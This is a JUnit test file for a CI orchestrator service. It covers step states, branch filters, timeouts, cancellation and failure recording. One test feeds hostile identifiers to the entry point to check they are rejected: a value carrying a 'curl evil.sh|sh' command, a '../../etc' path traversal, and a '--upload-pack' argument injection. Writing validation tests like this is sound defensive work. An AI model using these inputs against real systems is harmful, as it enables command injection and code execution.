package eu.wohlben.qits.ci.control;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import eu.wohlben.qits.ci.control.CiConfigSource.ConfigLookup;
import eu.wohlben.qits.ci.control.CiStepRunner.StepOutcome;
import eu.wohlben.qits.ci.control.CiStepRunner.StepResult;
import eu.wohlben.qits.ci.entity.CiRun;
import eu.wohlben.qits.ci.entity.CiRunStatus;
import eu.wohlben.qits.ci.entity.CiStep;
import eu.wohlben.qits.ci.entity.CiStepStatus;
import eu.wohlben.qits.ci.error.BadRequestException;
import eu.wohlben.qits.ci.error.ConflictException;
import eu.wohlben.qits.ci.error.NotFoundException;
import io.quarkus.test.junit.QuarkusTest;
import jakarta.inject.Inject;
import java.util.List;
import java.util.UUID;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import org.junit.jupiter.api.Test;

/**
 * Drives the orchestrator synchronously (package-private {@code execute}) against the fake config
 * source and the scripted-event step runner — the whole run/step state machine with no docker, no
 * container and no git host.
 */
@QuarkusTest
public class CiRunServiceTest extends CiTestSupport {

  private static final String CONFIG_TWO_STEPS =
      """
      steps:
        - image: alpine:3
          script: echo one
        - image: alpine:3
          script: echo two
      """;

  @Inject CiRunService service;

  /** Both green-run ports, for the one case that has to prove an all-skipped run is really green. */
  @Inject FakeRunAnnouncer announcer;

  @Inject FakeCdNotifier cdNotifier;

  private String repoId;
  private String sha;

  @org.junit.jupiter.api.BeforeEach
  void resetPorts() {
    announcer.reset();
    cdNotifier.reset();
  }

  private void seedConfig(String content) {
    repoId = UUID.randomUUID().toString();
    sha = UUID.randomUUID().toString().replace("-", "");
    fakeConfig.put(repoId, sha, ConfigLookup.found(content));
  }

  private CiRun soleRun() {
    List<CiRun> all = service.runsFor(repoId);
    assertEquals(1, all.size(), "expected exactly one recorded run");
    return all.get(0);
  }

  @Test
  public void greenRunRecordsSuccessWithStepOutputs() {
    seedConfig(CONFIG_TWO_STEPS);
    service.execute(repoId, "main", sha);

    CiRun run = soleRun();
    assertEquals(CiRunStatus.SUCCESS, run.status);
    assertEquals("main", run.branch);
    assertEquals(sha, run.commitSha);
    assertNotNull(run.finishedAt);
    // The run is pinned to one daemon build, resolved once before any step launched.
    assertEquals("fake-daemon", run.daemonVersion);

    List<CiStep> recorded = service.stepsFor(run.id);
    assertEquals(2, recorded.size());
    for (CiStep step : recorded) {
      assertEquals(CiStepStatus.SUCCESS, step.status);
      assertEquals(0, step.exitCode);
      assertEquals("ok step " + step.stepIndex, step.output);
      assertEquals("alpine:3", step.image);
      // Host-stamped at the two points the host knows about first-hand, and in that order.
      assertNotNull(step.startedAt, "a step that ran must carry a started_at");
      assertNotNull(step.finishedAt, "a step that ran must carry a finished_at");
      assertFalse(step.finishedAt.isBefore(step.startedAt));
    }
    // The runner saw the right specs, in order, each carrying the run's pinned binary url.
    assertEquals(2, fakeRunner.executed().size());
    assertEquals("echo one", fakeRunner.executed().get(0).script());
    assertEquals(sha, fakeRunner.executed().get(0).sha());
    assertEquals("main", fakeRunner.executed().get(0).branch());
    assertEquals(
        "http://fake.invalid/ci-daemon/fake-daemon", fakeRunner.executed().get(0).daemonBinaryUrl());
    // Chunks reached the listener while the step ran — the seam's event half.
    assertEquals(List.of("ok step 0", "ok step 1"), fakeRunner.emitted());
    // And the run released whatever the runner was holding for it.
    assertEquals(List.of(run.id), fakeRunner.closed());
  }

  @Test
  public void failingStepFailsTheRunAndSkipsTheRest() {
    seedConfig(CONFIG_TWO_STEPS);
    fakeRunner.script(0, new StepResult(7, false, StepOutcome.OK, "boom"));
    service.execute(repoId, "main", sha);

    CiRun run = soleRun();
    assertEquals(CiRunStatus.FAILED, run.status);
    List<CiStep> recorded = service.stepsFor(run.id);
    assertEquals(CiStepStatus.FAILED, recorded.get(0).status);
    assertEquals(7, recorded.get(0).exitCode);
    assertEquals("boom", recorded.get(0).output);
    assertEquals(CiStepStatus.SKIPPED, recorded.get(1).status);
    assertNull(recorded.get(1).exitCode);
    // A skipped step never started, so it carries neither timestamp.
    assertNull(recorded.get(1).startedAt);
    assertNull(recorded.get(1).finishedAt);
    // Only the failing step actually executed.
    assertEquals(1, fakeRunner.executed().size());
  }

  @Test
  public void timedOutStepFailsTheRunWithAMarkedOutput() {
    seedConfig(CONFIG_TWO_STEPS);
    fakeRunner.script(0, new StepResult(143, true, StepOutcome.OK, "partial output"));
    service.execute(repoId, "main", sha);

    CiRun run = soleRun();
    assertEquals(CiRunStatus.FAILED, run.status);
    CiStep first = service.stepsFor(run.id).get(0);
    assertEquals(CiStepStatus.FAILED, first.status);
    // Recorded as a timeout, not as a script that happened to exit 143.
    assertTrue(first.output.contains("[step timed out]"), first.output);
    assertTrue(first.output.contains("partial output"), first.output);
    assertEquals(143, first.exitCode);
  }

  @Test
  public void aDeclaredPerStepTimeoutOverridesTheDeploymentDefault() {
    seedConfig(
        """
        steps:
          - image: alpine:3
            script: echo quick
            timeout-seconds: 30
          - image: alpine:3
            script: echo slow
        """);
    service.execute(repoId, "main", sha);

    assertEquals(30, fakeRunner.executed().get(0).timeoutSeconds());
    // An absent field means exactly the behaviour before the key existed: the shipped default.
    assertEquals(900, fakeRunner.executed().get(1).timeoutSeconds());
  }

  @Test
  public void aDeclaredDockerFlagTravelsFromTheYamlToTheStepItWasDeclaredOn() {
    // The seam-level half of the docker-socket feature: everything from the parsed key to the argv is
    // covered elsewhere, and what this asserts is the wiring in between — that the flag arrives at the
    // runner attached to the step that declared it and to no other. The mount itself is
    // CiDaemonLauncherTest's subject; that a step which declared nothing keeps its sandbox is asserted
    // there as an absence, and here as a plain false.
    seedConfig(
        """
        steps:
          - image: alpine:3
            script: ./mvnw -B -ntp verify
          - image: alpine:3
            docker: true
            script: |
              docker build -t "$QITS_REGISTRY/$QITS_IMAGE_REPOSITORY/app:$QITS_CI_SHA" .
              docker push "$QITS_REGISTRY/$QITS_IMAGE_REPOSITORY/app:$QITS_CI_SHA"
        """);
    service.execute(repoId, "main", sha);

    assertEquals(CiRunStatus.SUCCESS, soleRun().status);
    assertEquals(2, fakeRunner.executed().size());
    assertFalse(fakeRunner.executed().get(0).docker(), "a step declaring nothing asks for no socket");
    assertTrue(fakeRunner.executed().get(1).docker(), "the publish step's declaration must arrive");
    // And a publish step is an ordinary step in every other respect — same image handling, same
    // recorded row, same deployment-default deadline unless it said otherwise.
    assertEquals(900, fakeRunner.executed().get(1).timeoutSeconds());
    assertEquals(CiStepStatus.SUCCESS, service.stepsFor(soleRun().id).get(1).status);
  }

  // --- the per-step branch filter ---

  private static final String CONFIG_MAINTENANCE_LEG =
      """
      steps:
        - image: node-base:latest
          script: npm test
        - image: node-base:latest
          branches:
            - prefix: maintenance/
          script: ./release.sh
      """;

  @Test
  public void aStepTheBranchDoesNotBindIsSkippedWithANoteAndTheRunStaysGreen() {
    seedConfig(CONFIG_MAINTENANCE_LEG);
    service.execute(repoId, "main", sha);

    CiRun run = soleRun();
    assertEquals(CiRunStatus.SUCCESS, run.status, "an unbound step is a non-event to the verdict");
    List<CiStep> recorded = service.stepsFor(run.id);
    assertEquals(2, recorded.size(), "the step is recorded, not passed over");
    assertEquals(CiStepStatus.SUCCESS, recorded.get(0).status);
    assertEquals(CiStepStatus.SKIPPED, recorded.get(1).status);
    assertEquals("[step not bound to branch main]", recorded.get(1).output);
    assertNull(recorded.get(1).exitCode);
    // Nothing started, so it carries neither timestamp — and no container was ever launched.
    assertNull(recorded.get(1).startedAt);
    assertNull(recorded.get(1).finishedAt);
    assertEquals(1, fakeRunner.executed().size());
  }

  @Test
  public void aBoundStepRunsOnTheBranchThatBindsIt() {
    seedConfig(CONFIG_MAINTENANCE_LEG);
    service.execute(repoId, "maintenance/qits-spa-ui-components", sha);

    assertEquals(CiRunStatus.SUCCESS, soleRun().status);
    List<CiStep> recorded = service.stepsFor(soleRun().id);
    assertEquals(CiStepStatus.SUCCESS, recorded.get(0).status);
    assertEquals(CiStepStatus.SUCCESS, recorded.get(1).status);
    assertEquals(2, fakeRunner.executed().size());
    assertEquals("./release.sh", fakeRunner.executed().get(1).script());
  }

  @Test
  public void anUnboundStepBlocksNothingAfterIt() {
    // The half a green run cannot show: `failed` is untouched, so the loop continues — asserted by
    // the step AFTER the unbound one actually executing.
    seedConfig(
        """
        steps:
          - image: alpine:3
            branches:
              - prefix: maintenance/
            script: ./release.sh
          - image: alpine:3
            script: echo after
        """);
    service.execute(repoId, "main", sha);

    List<CiStep> recorded = service.stepsFor(soleRun().id);
    assertEquals(CiStepStatus.SKIPPED, recorded.get(0).status);
    assertEquals(CiStepStatus.SUCCESS, recorded.get(1).status);
    assertEquals(1, fakeRunner.executed().size());
    assertEquals("echo after", fakeRunner.executed().get(0).script());
  }

  @Test
  public void theTwoKindsOfSkippedAreDistinguishableByTheirOutput() {
    // The whole of how they stay apart: a never-reached step keeps its null output, a branch-skipped
    // one carries the bracketed note. No new status, no new column, no migration.
    seedConfig(
        """
        steps:
          - image: alpine:3
            script: npm test
          - image: alpine:3
            branches:
              - prefix: maintenance/
            script: ./release.sh
          - image: alpine:3
            script: echo never
        """);
    fakeRunner.script(0, new StepResult(1, false, StepOutcome.OK, "tests failed"));
    service.execute(repoId, "main", sha);

    assertEquals(CiRunStatus.FAILED, soleRun().status);
    List<CiStep> recorded = service.stepsFor(soleRun().id);
    assertEquals(CiStepStatus.FAILED, recorded.get(0).status);
    // Both of the following are SKIPPED, and both were skipped for different reasons.
    assertEquals(CiStepStatus.SKIPPED, recorded.get(1).status);
    assertNull(recorded.get(1).output, "a step the loop never reached says nothing");
    assertEquals(CiStepStatus.SKIPPED, recorded.get(2).status);
    assertNull(recorded.get(2).output);
  }

  @Test
  public void aRunWithAnUnscopedABoundAndAnUnboundStepRecordsAllThreeReadably() {
    // The boundary case, read off the rows the way a person would: three declared steps, three
    // outcomes, one run, and the reason for each is in the row itself.
    seedConfig(
        """
        steps:
          - image: alpine:3
            script: npm test
          - image: alpine:3
            branches:
              - prefix: maintenance/
            script: ./release.sh
          - image: alpine:3
            branches:
              - exact: main
            script: ./deploy.sh
        """);
    service.execute(repoId, "maintenance/qits-spa-angular", sha);

    CiRun run = soleRun();
    assertEquals(CiRunStatus.SUCCESS, run.status);
    List<CiStep> recorded = service.stepsFor(run.id);
    assertEquals(3, recorded.size());
    assertEquals(CiStepStatus.SUCCESS, recorded.get(0).status, "the unscoped step ran");
    assertEquals(CiStepStatus.SUCCESS, recorded.get(1).status, "the bound step ran");
    assertEquals(CiStepStatus.SKIPPED, recorded.get(2).status, "the unbound step did not");
    assertEquals("[step not bound to branch maintenance/qits-spa-angular]", recorded.get(2).output);
    assertEquals(2, fakeRunner.executed().size());
  }

  @Test
  public void aRunWhoseEveryStepIsBranchSkippedFinishesGreenAndAnnounces() {
    // The empty-pipeline precedent rather than a new rule — and asserted rather than assumed,
    // because "trivially green" has to mean the same green: it notifies cd and it publishes.
    seedConfig(
        """
        steps:
          - image: alpine:3
            branches:
              - prefix: maintenance/
            script: ./release.sh
          - image: alpine:3
            branches:
              - exact: release
            script: ./ship.sh
        """);
    service.execute(repoId, "main", sha);

    CiRun run = soleRun();
    assertEquals(CiRunStatus.SUCCESS, run.status);
    assertEquals(0, fakeRunner.executed().size(), "no container was launched");
    List<CiStep> recorded = service.stepsFor(run.id);
    assertEquals(2, recorded.size());
    for (CiStep step : recorded) {
      assertEquals(CiStepStatus.SKIPPED, step.status);
      assertEquals("[step not bound to branch main]", step.output);
    }
    assertEquals(1, announcer.announced().size(), "a green run announces, however little it did");
    assertEquals(run.id, announcer.announced().get(0).runId());
    assertEquals(1, cdNotifier.notified().size());
    assertEquals(run.id, cdNotifier.notified().get(0).runId());
  }

  @Test
  public void brokenConfigRecordsAConfigErrorRunWithNoSteps() {
    seedConfig("steps:\n  - image: alpine:3\n"); // missing script
    service.execute(repoId, "main", sha);

    CiRun run = soleRun();
    assertEquals(CiRunStatus.CONFIG_ERROR, run.status);
    assertNotNull(run.finishedAt);
    // Nothing was ever launched, so the run pins no daemon.
    assertNull(run.daemonVersion);
    assertEquals(0, service.stepsFor(run.id).size());
    assertEquals(0, fakeRunner.executed().size());
  }

  @Test
  public void absentConfigRecordsNothing() {
    repoId = UUID.randomUUID().toString();
    service.execute(repoId, "main", "0123456789abcdef");
    assertEquals(0, service.runsFor(repoId).size());
  }

  @Test
  public void unreachableGitHostRecordsNothing() {
    repoId = UUID.randomUUID().toString();
    sha = "0123456789abcdef";
    fakeConfig.put(repoId, sha, ConfigLookup.unreachable());
    service.execute(repoId, "main", sha);
    assertEquals(0, service.runsFor(repoId).size());
  }

  @Test
  public void presentConfigWithNoStepsRecordsATriviallyGreenRun() {
    // Opted in (file present) but nothing to verify — visible, unlike an absent file.
    seedConfig("# no steps yet\n");
    service.execute(repoId, "main", sha);

    CiRun run = soleRun();
    assertEquals(CiRunStatus.SUCCESS, run.status);
    assertEquals(0, service.stepsFor(run.id).size());
  }

  @Test
  public void commitGoneBeforeTheRunRecordsNothing() {
    // Force-pushed away between push and run: nothing is recorded, so a commit whose build was
    // never broken is never shown red.
    repoId = UUID.randomUUID().toString();
    sha = "0123456789abcdef";
    fakeConfig.put(repoId, sha, ConfigLookup.gone());
    service.execute(repoId, "main", sha);
    assertEquals(0, service.runsFor(repoId).size());
  }

  @Test
  public void unusableConfigRecordsAConfigErrorRun() {
    repoId = UUID.randomUUID().toString();
    sha = "0123456789abcdef";
    fakeConfig.put(repoId, sha, ConfigLookup.invalid("too large"));
    service.execute(repoId, "main", sha);
    assertEquals(CiRunStatus.CONFIG_ERROR, soleRun().status);
  }

  @Test
  public void aShaGoneCheckoutDiscardsTheRunWhenTheCommitIsIndeedGone() {
    // The daemon's checkout is the probe now: it reports SHA_GONE, and the config re-read confirms
    // the commit was force-pushed away mid-queue. The run describes a push that no longer exists.
    seedConfig(CONFIG_TWO_STEPS);
    fakeConfig.put(repoId, sha, ConfigLookup.gone()); // what the post-failure re-read sees
    fakeRunner.script(
        0,
        new StepResult(-1, false, StepOutcome.SHA_GONE, "fatal: reference is not a tree: deadbeef"));
    service.execute(repoId, "main", sha);
    assertEquals(0, service.runsFor(repoId).size());
  }

  @Test
  public void aShaGoneCheckoutOnAReachableCommitStaysOnTheRecord() {
    // Same frame, different truth: the commit is still there, so something else broke the checkout
    // and the user must see it. Discarding here would hide a broken pipeline.
    seedConfig(CONFIG_TWO_STEPS);
    fakeRunner.script(
        0, new StepResult(-1, false, StepOutcome.SHA_GONE, "fatal: could not read from remote"));
    service.execute(repoId, "main", sha);

    CiRun run = soleRun();
    assertEquals(CiRunStatus.FAILED, run.status);
    List<CiStep> recorded = service.stepsFor(run.id);
    assertEquals(CiStepStatus.FAILED, recorded.get(0).status);
    assertTrue(recorded.get(0).output.contains("could not read from remote"));
    assertTrue(recorded.get(0).output.contains("could not check out"), recorded.get(0).output);
    assertEquals(CiStepStatus.SKIPPED, recorded.get(1).status);
  }

  @Test
  public void anInitFailureWithNoReasonIsRecordedGenericallyAndNeverDiscardsTheRun() {
    // A hostile daemon can send InitFailed with an absent reason — the codec decodes that to null
    // rather than throwing, deliberately. It has to land as a generic setup failure and must NOT
    // fall through the SHA_GONE branch, which would let a container delete the run watching it.
    seedConfig(CONFIG_TWO_STEPS);
    fakeConfig.put(repoId, sha, ConfigLookup.gone()); // the re-read would say "discard" if reached
    fakeRunner.script(0, new StepResult(-1, false, StepOutcome.INIT_FAILED, "(no reason given)"));
    service.execute(repoId, "main", sha);

    CiRun run = soleRun();
    assertEquals(CiRunStatus.FAILED, run.status);
    CiStep first = service.stepsFor(run.id).get(0);
    assertEquals(CiStepStatus.FAILED, first.status);
    assertTrue(first.output.contains("could not prepare its workspace"), first.output);
  }

  @Test
  public void eachDistinguishableFailureStateIsRecordedAsItself() {
    // The transferred failure-state rule: docker refusing the launch, a container that never started
    // a daemon, one that registered and never finished a checkout, and a socket lost mid-step are
    // four different things, and none of them is "the step failed with exit -1".
    for (StepOutcome outcome :
        List.of(
            StepOutcome.LAUNCH_FAILED,
            StepOutcome.NEVER_STARTED,
            StepOutcome.NEVER_INITIALIZED,
            StepOutcome.CONNECTION_LOST)) {
      resetCiState();
      seedConfig(CONFIG_TWO_STEPS);
      fakeRunner.script(0, new StepResult(-1, false, outcome, "diagnosis for " + outcome));
      service.execute(repoId, "main", sha);

      CiStep first = service.stepsFor(soleRun().id).get(0);
      assertEquals(CiStepStatus.FAILED, first.status, outcome.name());
      assertTrue(first.output.contains("diagnosis for " + outcome), first.output);
      assertEquals(
          expectedNote(outcome),
          first.output.substring(first.output.lastIndexOf('[')),
          "each state must record a message that is only its own");
    }
  }

  private static String expectedNote(StepOutcome outcome) {
    return switch (outcome) {
      case LAUNCH_FAILED -> "[the step container could not be started]";
      case NEVER_STARTED -> "[the step container never started its ci daemon]";
      case NEVER_INITIALIZED -> "[the step container never reported its checkout done]";
      case CONNECTION_LOST -> "[the connection to the step container was lost]";
      default -> throw new IllegalArgumentException(outcome.name());
    };
  }

  @Test
  public void aFailureMidRunRecordsTheStepItHappenedOnAndSkipsTheRest() {
    // A crash inside the runner must not make a declared step vanish from the run: nothing is
    // written upfront any more, so the exception path is what has to write those rows.
    seedConfig(CONFIG_TWO_STEPS);
    fakeRunner.throwOn(0, new IllegalStateException("transient failure"));
    service.execute(repoId, "main", sha);

    CiRun run = soleRun();
    assertEquals(CiRunStatus.FAILED, run.status);
    assertNotNull(run.finishedAt);
    List<CiStep> recorded = service.stepsFor(run.id);
    assertEquals(2, recorded.size(), "every declared step must still have a row");
    assertEquals(CiStepStatus.FAILED, recorded.get(0).status);
    assertTrue(recorded.get(0).output.contains("transient failure"), recorded.get(0).output);
    assertEquals(CiStepStatus.SKIPPED, recorded.get(1).status);
  }

  @Test
  public void aCancellationMidStepFailsThatStepAndSkipsTheRest() throws Exception {
    // Staged the way it really happens: the run is on the worker, step 0 is executing, and the
    // cancellation arrives from another thread — the HTTP one. The fake holds step 0 open until the
    // POST has landed, so there is no sleep and no race about when "mid-step" is.
    //
    // Note the step still FINISHES normally afterwards — a daemon answers a Cancel with a terminal
    // frame — so cancelledness has to be read from the flag, never inferred from how run() returned.
    seedConfig(CONFIG_TWO_STEPS);
    CompletableFuture<String> reachedStepZero = new CompletableFuture<>();
    CountDownLatch cancelled = new CountDownLatch(1);
    fakeRunner.during(
        0,
        spec -> {
          reachedStepZero.complete(spec.runId());
          try {
            cancelled.await(10, TimeUnit.SECONDS);
          } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
          }
        });
    fakeRunner.script(0, new StepResult(137, false, StepOutcome.OK, "half a line"));

    service.onPostReceive(repoId, "main", "0".repeat(40), sha);
    String runId = reachedStepZero.get(10, TimeUnit.SECONDS);
    service.cancel(runId);
    cancelled.countDown();
    service.awaitIdle();

    // The cancel above read the run into this thread's persistence context while it was still
    // RUNNING; without this the assertions below would read that copy back rather than the worker's.
    forgetLoadedEntities();
    CiRun run = soleRun();
    assertEquals(CiRunStatus.FAILED, run.status);
    List<CiStep> recorded = service.stepsFor(run.id);
    assertEquals(CiStepStatus.FAILED, recorded.get(0).status);
    assertTrue(recorded.get(0).output.contains("cancelled"), recorded.get(0).output);
    assertTrue(recorded.get(0).output.contains("half a line"), recorded.get(0).output);
    assertEquals(CiStepStatus.SKIPPED, recorded.get(1).status);
    // The runner was actually asked to stop the container, not just flagged.
    assertEquals(List.of(run.id), fakeRunner.cancelled());
    assertEquals(1, fakeRunner.executed().size(), "step 1 must never have been launched");
  }

  @Test
  public void cancellingAFinishedRunIsAConflictAndAnUnknownRunIsANotFound() {
    seedConfig(CONFIG_TWO_STEPS);
    service.execute(repoId, "main", sha);
    String runId = soleRun().id;

    assertThrows(ConflictException.class, () -> service.cancel(runId));
    assertThrows(NotFoundException.class, () -> service.cancel("no-such-run"));
    // A refused cancellation must not have reached the runner at all.
    assertEquals(List.of(), fakeRunner.cancelled());
  }

  @Test
  public void hostileIdentifiersAreRejectedAtTheEntryPoint() {
    // The intake is reachable without a session, so the ids it supplies are validated before they
    // reach a filesystem path or an argv.
    String good = UUID.randomUUID().toString();
    assertThrows(
        BadRequestException.class,
        () -> service.onPostReceive(good, "main", null, "HEAD\nset +e\ncurl evil.sh|sh #"));
    assertThrows(
        BadRequestException.class,
        () -> service.onPostReceive("../../etc", "main", null, "cafebabe0000000"));
    assertThrows(
        BadRequestException.class,
        () -> service.onPostReceive(good, "--upload-pack=evil", null, "cafebabe0000000"));
  }

  @Test
  public void onPostReceiveExecutesAsynchronously() throws Exception {
    seedConfig(CONFIG_TWO_STEPS);
    service.onPostReceive(repoId, "main", "0".repeat(40), sha);
    service.awaitIdle();
    assertEquals(CiRunStatus.SUCCESS, soleRun().status);
  }

  @Test
  public void tailKeepsTheEndAndMarksTheCut() {
    assertNull(CiRunService.tail(null, 10));
    assertEquals("short", CiRunService.tail("short", 10));
    assertEquals("exactlyten", CiRunService.tail("exactlyten", 10));
    String cut = CiRunService.tail("0123456789abcdef", 10);
    assertEquals(CiRunService.TRUNCATION_MARKER + "6789abcdef", cut);
  }
}
